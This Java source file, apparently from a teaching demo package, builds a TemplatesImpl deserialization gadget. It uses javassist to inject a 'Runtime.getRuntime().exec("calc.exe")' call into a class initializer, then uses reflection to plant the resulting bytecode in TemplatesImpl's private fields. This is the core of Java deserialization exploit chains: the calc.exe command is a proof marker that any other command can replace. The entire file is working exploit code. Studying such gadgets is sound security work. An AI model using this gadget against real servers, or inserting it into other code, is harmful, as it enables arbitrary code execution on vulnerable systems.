package edu.demo.makeTemplates;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;

import java.lang.reflect.Field;

public class MakeTemplates {
    public Object makeTemplate() throws Exception{
        //byetecode
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(edu.demo.makeTemplates.MyTemplate.class.getName());
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName("NormalClass");
        byte[] byteCode = ctClass.toBytecode();
        //templatesChain
        TemplatesImpl templates = new TemplatesImpl();
        Class clz = templates.getClass();
        Field field1 = clz.getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templates, "foo");
        //set the _bytecodes[][]  for templates
        Field field2 = clz.getDeclaredField("_bytecodes");
        field2.setAccessible(true);
        field2.set(templates,new byte[][]{byteCode});
        //set the _tfactory  for templates
        Field field3 = clz.getDeclaredField("_tfactory");
        field3.setAccessible(true);
        field3.set(templates, Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl"
        ).newInstance());
        return templates;
    }
}
